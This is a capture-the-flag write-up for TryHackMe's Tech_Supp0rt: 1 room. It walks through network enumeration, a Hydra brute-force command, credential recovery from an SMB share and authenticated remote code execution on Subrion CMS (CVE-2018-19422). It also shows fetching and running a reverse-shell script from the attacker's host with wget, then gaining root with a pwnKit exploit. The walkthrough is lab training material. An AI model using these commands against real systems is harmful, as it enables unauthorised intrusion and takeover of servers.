<h1 align="center"><a href="https://tryhackme.com/room/techsupp0rt1">TryHackMe Tech_Supp0rt: 1 Room</a></h1>

<h2 align="center"><a href="https://twitter.com/0xTas">Writeup By: 0xTas</a></h2>

<p align="center">
    <a href="https://tryhackme.com/p/0xTas">
        <img alt="0xTas TryHackMe Profile" src="https://tryhackme-badges.s3.amazonaws.com/0xTas.png"></a>  
</p>


<h3 align="center">12 June 2022</h3>

---

## Description:

Hack into the scammer's under-development website to foil their plans.


## Questions:


### What is the root.txt flag?

I started off by scanning the server with Nmap:

`tas@kali$ nmap -vv -sV -sC -T4 -p- support.thm -oN nmap/full.log` <br>

> 22/tcp  open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) <br>
> 80/tcp  open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu)) <br>
> 139/tcp open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP) <br>
> 445/tcp open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)

Looks like we're working with SSH, a webserver, and Samba.
Nmap also has more info to show: <br>

![Nmap -sC Results](https://i.imgur.com/Vz9CwNG.png)

---

The next thing I did was scan that webserver with Gobuster and Nikto. <br>
While those scans are running, I visited the webserver's homepage. <br>
As foretold by Nmap, it was just an Apache2 Ubuntu default page. <br>
I checked the source for any potential comments or signs of modification but there were none. <br>

`tas@kali$ gobuster dir -u http://support.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` <br>

> /wordpress <br>
> /test <br>
> /server-status <br>

Gobuster found two potentially useful endpoints. <br>
The first one I visited was /test, but after viewing the source, it didn't look like there was going to be much of use on this page. <br>

/wordpress was a bit more interesting, and after looking around I stumbled across a wp-admin login page. <br>
There was also a single blog post from a user called 'support', so I have a potential username.

---

`$ nikto -h http://support.thm` <br>

![Nikto Scan Results](https://i.imgur.com/fp2dj0d.png)


Nikto didn't have anything too helpful to show me, but it did find a /phpinfo.php endpoint which had some interesting server info on it. <br>
Nothing I could see was directly exploitable to my knowledge, however.

---

I decided to try brute-forcing credentials for the wp-login page with Hydra: <br>

`tas@kali$ hydra -l support -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/wordpress/wp-login.php:log=support&pwd=^PASS^:F=The password you entered "` <br>

Unfortunately, Hydra did not end up finding any valid credentials for the wp-admin.php page. <br>

---

The next thing I decided to do was further enumerate that SMB server that I saw on port 445 from Nmap. <br>

I decided to fire off a quick `smbmap` to enumerate shares, as it's the only tool for Samba that I knew anything about. <br>

`tas@kali$ smbmap -H $IP` <br>

![SMBmap Output](https://i.imgur.com/6Loye4j.png)


So it looks like there's only one share that I might be able to connect to with this guest session. <br>

I don't have very much experience using or enumerating Samba yet, so I turned to Google and found this helpful resource from [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb). <br>

A bit down on the page, it showed that I could connect to a share and view its contents much like an FTP server, using the command `smbclient`: <br>

> #Connect using smbclient <br>
> smbclient --no-pass //$IP/Folder <br>

`tas@kali$ smbclient --no-pass //$IP/websvr` <br>

![smbclient output](https://i.imgur.com/DqJ0qJR.png)

There was only one file in the share or folder, so I pulled it down to my local machine: <br>

`smb: \> get enter.txt` <br>
`smb: \> exit` <br>

`tas@kali$ cat enter.txt` <br>

![enter.txt](https://i.imgur.com/u3E1yNx.png)

That file was definitely interesting, it looked like there was a hash or encoded credential for something called Subrion. <br>
Another quick Google search told me that Subrion is another CMS, much like Wordpress. <br>

A couple more things stood out to me in the enter.txt file: <br>

1. "Fix subrion site, /subrion doesn't work, edit from panel"
2. "[cooked with magical formula]"

The "cooked with magical formula" comment immediately made me think of [CyberChef's "Magic" mode.](https://gchq.github.io/CyberChef/) <br>

After pasting the hash-like into Cyberchef and selecting the Magic operation, I was instantly greeted with what looked like a plaintext credential. <br>

> S******1


Next I needed to find where to input this credential, so I did a search for Subrion's default admin panel location and tried to navigate there: <br>

> `http://support.thm/admin` <br>
> 404, no luck. <br>
> `http://support.thm/panel` <br>
> 404, nothing here. <br>
> `http://support.thm/subrion` <br>
> Again, no dice, but enter.txt did say /subrion wouldn't work, and to "edit from panel" <br>
> `http://support.thm/subrion/panel` <br>
> Found it, this endpoint was live and took me straight to the Subrion login panel.

At first, when attempting to login with my newfound credentials, I got a response that said something along the lines of: <br>

> "request was treated as a potenial CSRF attack" <br>

This confused me, but a few seconds later I was redirected to the admin dashboard of Subrion. <br>

When enumerating CMS like Wordpress, Sweetrice, or Subrion, it's generally a good idea to try and identify the version that's installed. <br>
Luckily for me, the dashboard was very generous and showed me this information right away. <br>

![Subrion CMS version 4.2.1](https://i.imgur.com/oFvQgEE.png)

Heading back to Google, I searched for "Subrion 4.2.1 exploits", and was instantly met with an Exploit-DB page advertising arbitrary file upload for Subrion 4.2.1. <br>

The exploit, titled [CVE-2018-19422](https://nvd.nist.gov/vuln/detail/CVE-2018-19422), allows authenticated users to upload and execute arbitrary code using .pht or .phar files,
because the .htaccess file doesn't account for and blacklist them. <br>

Looking over the Python PoC on Exploit-DB, it appears to do just that, and provides a handy console interface for executing your commands once it has uploaded a malicious PHP webshell. <br>

I copied the script and made sure that the required 3rd-party module BeautifulSoup4 was installed, before running it against the target: <br>

`tas@kali$ python3 SubrionRCE.py -u http://support.thm/subrion/panel -l admin -p $PASS` <br>

This told me that the login had failed, and to check my credentials. I did, and they were correct, so I had to take a closer look at the exploit script. <br>

It turned out that the script was checking the length of the server's response and using that to decide whether the login had failed or not. <br>

![Failing section of code](https://i.imgur.com/j9RT6zZ.png)

I modified the script to print out the "auth.text" response, and ran it again. <br>

The response printed to my console showed me that it was actually successfully logging in, but since the response was shorter than 7000 bytes, the script would just die right there anyways. <br>
So next I modified the script to bypass that check altogether. Then I ran the script again. This time it worked. <br>

![Subrion RCE](https://i.imgur.com/tHlE7NO.png)

Great, now I had RCE. Due to the finnicky nature of this Python script, and the fact that it was only a webshell, I decided to immediately escalate to a full reverse shell. <br>

> `$ which wget` <br>
> /bin/wget <br>
> `tas@kali$ python3 -m http.server --directory /home/tas 80` <br>
> `$ wget http://myIP/shell.sh` <br>
> `$ /bin/bash shell.sh` <br>

![I Caught a shell](https://i.imgur.com/V427JEj.png)

Next, I decided to stabilize my shell with Python3: <br>

> `$ which python3` <br>
> /usr/bin/python3 <br>
> `$ python3 -c 'import pty; pty.spawn("/bin/bash")'` <br>
> Ctrl-z to background the shell <br>
> `tas@kali$ stty raw -echo` <br>
> `tas@kali$ fg` <br>
> Pressing enter a couple times.. <br>
> `www-data@TechSupport$ export TERM=xterm` <br>

Then I continued enumerating from inside the server. <br>

After checking a few things like the kernel version and sudo permissions for www-data, I decided to search for SUID binaries. <br>

`www-data@TechSupport$ find / -perm -u=s -type f 2>/dev/null` <br>

![SUID Binaries on the server](https://i.imgur.com/XNyxzKQ.png)

Cross-referencing this list with [GTFOBins](https://gtfobins.github.io/#+suid), there didn't appear to be any misconfigured SUID binaries on this server. <br>

I did notice something myself though, this server has the binary `pkexec`, which was semi-recently found to be vulnerable to a privilege escalation exploit known as [pwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034). <br>

The exploit takes advantage of a memory corruption vulnerability in the pkexec binary to inject an environment variable at runtime which can load and execute code from a malicious .so file. <br>
I had already learned about and played with [the exploit](https://tryhackme.com/room/pwnkit) before, so I decided to try it out on this server. <br>

> `www-data@TechSupport$ which gcc` <br>
> *nothing* <br>

There was no gcc installed, so I'd need to use precompiled binaries instead to preform this exploit. <br>
```
www-data@TechSupport$ wget http://myIP/pwnKit.zip
www-data@TechSupport$ unzip pwnKit.zip
www-data@TechSupport$ chmod +x pwnExploit
www-data@TechSupport$ ./pwnExploit
```

> `# id` <br>
> uid=0(root)

![polkit "pwnKit" Exploit in action](https://i.imgur.com/jIzNISi.png)


Now that I had root, I could retrieve the root.txt flag: <br>

`# cat /root/root.txt` <br>

> Answer: 851b8233a8c09400e***********************

---


